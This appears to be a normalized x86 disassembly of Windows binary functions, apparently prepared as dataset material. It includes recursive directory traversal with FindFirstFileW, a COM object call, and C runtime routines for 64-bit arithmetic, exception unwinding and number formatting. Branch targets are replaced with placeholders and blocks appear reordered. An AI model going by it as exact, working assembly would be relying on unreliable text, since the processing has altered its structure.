sub_41602a
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x660
push esi
push edi
xor eax eax
push 0x206
push eax
mov [ esp + 0x10 ] ax
lea eax [ esp + 0x12 ]
push eax
call sub_405830
mov edi [ lstrcpyW@IAT ]
add esp 0xc
push [ ebp + 0xc ]
lea eax [ esp + 0xc ]
push eax
call edi
mov esi [ lstrcatW@IAT ]
push r--data
lea eax [ esp + 0xc ]
push eax
call esi
mov eax [ ebp + 0x10 ]
add eax 0x2c
push eax
lea eax [ esp + 0xc ]
push eax
call esi
push r--data
lea eax [ esp + 0xc ]
push eax
call esi
lea eax [ esp + 0x8 ]
push eax
call [ lstrlenW@IAT ]
lea eax [ esp + 0x8 ]
test eax eax
je r-xdata
pop edi
mov al 0x1
pop esi
mov esp ebp
pop ebp
retn
xor eax eax
cmp eax sub_415f1d
je r-xdata
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x464 ]
push eax
call edi
push r--data
lea eax [ esp + 0x464 ]
push eax
call esi
lea eax [ esp + 0x210 ]
push eax
lea eax [ esp + 0x464 ]
push eax
call [ FindFirstFileW@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov esi [ lstrcmpW@IAT ]
push 0x0
call [ Sleep@IAT ]
push r--data
lea eax [ esp + 0x240 ]
push eax
call esi
test eax eax
je r-xdata
test [ esp + 0x210 ] 0x10
je r-xdata
push edi
call [ FindClose@IAT ]
lea eax [ esp + 0x210 ]
push eax
push edi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x240 ]
push eax
call esi
test eax eax
je r-xdata
push 0x0
lea eax [ esp + 0x214 ]
push eax
lea eax [ esp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_415f1d
add esp 0x10
test al al
je r-xdata
sub_41616b
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x664
push ebx
push esi
push edi
xor eax eax
push 0x206
push eax
mov [ esp + 0x18 ] ax
lea eax [ esp + 0x1a ]
push eax
call sub_405830
mov esi rw-data
add esp 0xc
mov eax esi
call sub_40c0aa
test al al
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov ebx rw-data
mov eax ebx
mov ecx esi
call sub_40c1af
lea edi [ esp + 0x10 ]
call sub_4014fd
test al al
je r-xdata
mov edx ebx
mov ecx esi
call sub_40c257
mov edi esi
call sub_40bea8
mov eax edi
push eax
call [ lstrlenW@IAT ]
mov eax edi
test eax eax
je r-xdata
xor eax eax
cmp eax sub_41602a
je r-xdata
mov eax edi
push eax
lea eax [ esp + 0x46c ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ esp + 0x46c ]
push eax
call [ lstrcatW@IAT ]
lea eax [ esp + 0x218 ]
push eax
lea eax [ esp + 0x46c ]
push eax
call [ FindFirstFileW@IAT ]
mov [ esp + 0xc ] eax
cmp eax 0xffffffff
je r-xdata
mov edi [ lstrcmpW@IAT ]
push 0x0
call [ Sleep@IAT ]
push r--data
lea eax [ esp + 0x248 ]
push eax
call edi
test eax eax
je r-xdata
test [ esp + 0x218 ] 0x10
je r-xdata
push [ esp + 0xc ]
call [ FindClose@IAT ]
lea eax [ esp + 0x218 ]
push eax
push [ esp + 0x10 ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x248 ]
push eax
call edi
test eax eax
je r-xdata
push 0x0
lea eax [ esp + 0x21c ]
push eax
lea eax [ esp + 0x18 ]
push eax
push [ ebp + 0x8 ]
call sub_41602a
add esp 0x10
test al al
je r-xdata
sub_4162bf
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41ae39
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xa8
push ebx
push esi
push edi
lea eax [ esp + 0x68 ]
push eax
call sub_412634
xor ebx ebx
mov [ esp + 0xbc ] ebx
lea esi [ esp + 0x1c ]
call sub_40c9fb
mov [ esp + 0xbc ] 0x1
lea eax [ esp + 0x8c ]
push eax
call sub_412634
mov [ esp + 0xbc ] 0x2
push ebx
mov [ esp + 0x17 ] 0x1
call [ CoInitialize@IAT ]
lea eax [ esp + 0x18 ]
push eax
push r--data
push 0x1
push ebx
push r--data
call [ CoCreateInstance@IAT ]
cmp eax ebx
jne r-xdata
call [ CoUninitialize@IAT ]
mov eax [ esp + 0x94 ]
push 0xd
xor edx edx
pop ecx
div ecx
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ eax ]
lea edx [ esp + 0x14 ]
push edx
push eax
call [ ecx + 0x1c ]
cmp eax ebx
jne r-xdata
mov [ esp + 0xbc ] 0x1
lea eax [ esp + 0x8c ]
push eax
call sub_4125f1
mov [ esp + 0xbc ] bl
lea esi [ esp + 0x1c ]
call sub_40c938
or [ esp + 0xbc ] 0xffffffff
lea eax [ esp + 0x68 ]
push eax
call sub_4125f1
mov ecx [ esp + 0xb4 ]
mov al [ esp + 0x13 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ esp + 0x8c ]
push eax
lea ecx [ esp + 0x20 ]
call sub_41289d
push [ esp + 0x20 ]
push ebx
push 0xf
call sub_40ed22
mov esi [ ebp + 0x8 ]
push eax
push ebx
push 0x80760002
push [ esp + 0x38 ]
push [ esp + 0x38 ]
call sub_40ffc9
mov [ esp + 0x13 ] al
mov eax [ esp + 0x18 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
cmp eax ebx
jne r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
jmp r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
lea edx [ esp + 0x2c ]
push edx
lea edx [ esp + 0x44 ]
push edx
push 0x1
push eax
call [ ecx + 0xc ]
test eax eax
je r-xdata
mov esi [ esp + 0x44 ]
cmp esi ebx
je r-xdata
cmp [ esp + 0x48 ] ebx
je r-xdata
push esi
call [ lstrlenW@IAT ]
lea ecx [ esp + 0x68 ]
push ecx
mov edx esi
mov ecx 0x12530264
call sub_412a64
lea eax [ esp + 0x4c ]
test eax eax
je r-xdata
lea eax [ esp + 0x68 ]
push eax
lea ecx [ esp + 0x20 ]
call sub_41289d
push [ esp + 0x20 ]
mov edx [ esp + 0x20 ]
lea eax [ esp + 0x90 ]
push eax
call sub_4129ad
push [ esp + 0x48 ]
call [ CoTaskMemFree@IAT ]
push [ esp + 0x44 ]
call [ CoTaskMemFree@IAT ]
mov esi [ esp + 0x80 ]
push 0x8
pop edi
push eax
lea eax [ esp + 0x80 ]
mov [ esp + 0x34 ] 0x8ba39d9
mov [ esp + 0x38 ] 0x4
mov [ esp + 0x39 ] edi
call sub_40cb2c
lea eax [ esp + 0x30 ]
push eax
push 0xd
pop edi
lea eax [ esp + 0x70 ]
mov [ esp + 0x3d ] esi
call sub_40cb2c
sub_4164f0
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_4165a0
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_416640
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_4166a8
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_4166e1
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_416735
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_418192
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_41676b
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_4056bc
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_418192
add esp 0x20
pop esi
pop ebp
retn
sub_41679e
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_416875
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_403c1c
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_416875
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_4056bc
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_418192
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_41679e
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_4166e1
pop ebx
leave
retn
sub_416914
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_404171
call sub_404171
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_416987
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_403c1c
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_403c1c
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_4169b3
mov edi edi
push ebp
mov ebp esp
call sub_403c1c
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_4169da
mov edi edi
push ebp
mov ebp esp
push esi
call sub_403c1c
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_403c1c
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_403c1c
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_404171
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_416a2c
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_41676b
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_418280
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_416aab
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_4023eb
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_406f75
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_41834e
test eax eax
movsx eax [ esi ]
push eax
call sub_406f75
pop ecx
cmp eax 0x78
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
add esi 0x2
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
cmp [ ebp - 0x4 ] cl
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_416b1f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_4023eb
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
mov esi [ ebp - 0x10 ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
mov [ eax ] cl
test cl cl
jne r-xdata
dec eax
sub_416ba1
mov edi edi
push ebp
mov ebp esp
fldz
mov eax [ ebp + 0x8 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_416bbd
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_418424
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_41837c
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_416c19
mov edi edi
push esi
mov esi eax
test edi edi
je r-xdata
pop esi
retn
push esi
call sub_404060
inc eax
push eax
push esi
add esi edi
push esi
call sub_401f50
add esp 0x10
sub_416c5e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_4023eb
xor ecx ecx
cmp ebx ecx
jne r-xdata
cmp [ ebp + 0x8 ] ecx
jbe r-xdata
call sub_40515f
push 0x16
cmp [ ebp + 0xc ] ecx
jle r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
push edi
cmp [ ebp + 0x18 ] cl
je r-xdata
call sub_40515f
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] ecx
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_416c19
pop esi
mov [ eax ] esi
call sub_40510d
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
mov cl [ esi + 0x1 ]
mov eax [ ebp - 0x10 ]
mov [ esi ] cl
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
inc esi
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_4050bb
int3
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x10 ] eax
je r-xdata
push r--data
push ebx
push esi
call sub_403f64
add esp 0xc
test eax eax
jne r-xdata
mov eax [ edi + 0xc ]
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
pop edi
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi + 0x1 ] 0x2d
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_401f50
add esp 0xc
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi + 0x2 ] al
mov eax edx
pop esi
pop ebx
leave
retn
add [ esi + 0x4 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi + 0x3 ] al
mov eax edx
sub_416dbf
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop ebx
push ebx
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_418632
add esp 0x14
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
call sub_40515f
mov [ eax ] ebx
call sub_40510d
mov eax ebx
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4056bc
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
test esi esi
setg cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x0
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_416c5e
add esp 0x18
mov [ edi ] 0x0
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
test esi esi
setg cl
add eax edi
add ecx eax
push ecx
call sub_4184cc
add esp 0x10
test eax eax
je r-xdata
sub_416e86
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_416dbf
add esp 0x18
pop ebp
retn
sub_416ea6
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_4023eb
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_40515f
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
mov [ esi ] 0x0
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_40515f
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
mov [ eax ] esi
call sub_40510d
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
neg ebx
sbb ebx ebx
mov [ esi ] 0x30
mov [ esi + 0x1 ] al
mov ecx [ edi + 0x4 ]
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi + 0x2 ] 0x31
add esi 0x3
mov [ esi + 0x2 ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
add esi 0x3
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_416e86
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edx
jne r-xdata
cmp [ ebp + 0x18 ] 0x0
mov [ esi ] 0x30
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi + 0x1 ] al
push 0x65
add esi 0x2
push esi
call sub_4182d0
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_4165a0
add ax 0x30
movzx eax ax
cmp eax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_4165a0
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
